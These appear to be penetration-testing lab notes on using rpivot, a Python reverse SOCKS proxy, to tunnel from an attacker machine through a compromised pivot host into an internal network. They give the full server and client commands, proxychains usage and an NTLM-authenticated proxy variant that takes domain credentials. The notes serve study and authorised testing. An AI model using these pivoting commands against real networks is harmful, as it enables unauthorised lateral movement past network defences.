-- -
reverse SOCKS proxy tool written in Python. Will facilitate the tunnel from attackbox to target pivot point, but you will still need proxychains.
#### Install python2.7
I'm guess this doesn't work w/ python3 so you need to make sure both your attackbox and the pivot host have python2.7 installed. 
###### via package manager
```bash
# whatever flavor of linux:
sudo apt-get install python2.7
sudo pacman -S python2.7
```
###### manual
```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```
#### Run server
Run the server script from your attackbox:
```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
#### Run Client
First, [[SCP|file transfer]] the entire rpivot directory over to the pivot host. Then run the client script on the pivot host:
```bash
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```
#### Proxychains
Make sure proxychains is configured to the proxy port you gave in the server.py command, and then just use proxychains:
```bash
proxychains firefox-esr 172.16.5.135:80
```
#### Connecting to a Web Server usint HTTP-Proxy & NTLM Auth
```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```